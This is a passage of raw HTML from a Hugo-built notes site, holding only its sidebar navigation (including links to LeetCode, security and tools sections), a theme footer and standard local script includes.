class=padding href=/leetcode/index.html>LeetCodes</a><ul id=R-subsections-76e85062179d09303530c47eb73fc667 class=collapsible-menu></ul></li><li data-nav-id=/problem-solutions/index.html><a class=padding href=/problem-solutions/index.html>Problem Solutions</a><ul id=R-subsections-4f9e0f3095337026c1723515d5409f89 class=collapsible-menu></ul></li><li data-nav-id=/security/index.html><a class=padding href=/security/index.html>Securities</a><ul id=R-subsections-66815ecaaecfc1c209e5637d03b258b2 class=collapsible-menu></ul></li><li data-nav-id=/side-project/index.html><a class=padding href=/side-project/index.html>Side Projects</a><ul id=R-subsections-3295de6e89859c4cf23a4292e734c881 class=collapsible-menu></ul></li><li data-nav-id=/survey-papers/index.html><a class=padding href=/survey-papers/index.html>Survey Papers</a><ul id=R-subsections-baa5a308e222e800d6e93248dad73a11 class=collapsible-menu></ul></li><li data-nav-id=/terminology/index.html><a class=padding href=/terminology/index.html>Terminologies</a><ul id=R-subsections-a19bf87a9a9aaf0a4146b803a35492f8 class=collapsible-menu></ul></li><li data-nav-id=/toc/index.html><a class=padding href=/toc/index.html>TOCs</a><ul id=R-subsections-451d3779340ac1afa8683c0232808cbf class=collapsible-menu></ul></li><li data-nav-id=/tools/index.html><a class=padding href=/tools/index.html>Tools</a><ul id=R-subsections-bf1399820dde3dd110e03ace4147ff86 class=collapsible-menu></ul></li></ul></div><div class="R-sidebarmenu R-shortcutmenu-shortcuts"><ul class="space collapsible-menu"></ul></div><div id=R-footer-margin></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-footercontrols"><ul></ul></div><div id=R-footer><p>Built with <a href=https://github.com/McShelby/hugo-theme-relearn title=love><i class="fas fa-heart"></i></a> by <a href=https://gohugo.io/>Hugo</a></p></div></div></aside><script src=/js/clipboard/clipboard.min.js?1743619851 defer></script><script src=/js/perfect-scrollbar/perfect-scrollbar.min.js?1743619851 defer></script><script src=/js/theme.min.js?1743619851 defer></script></body></html>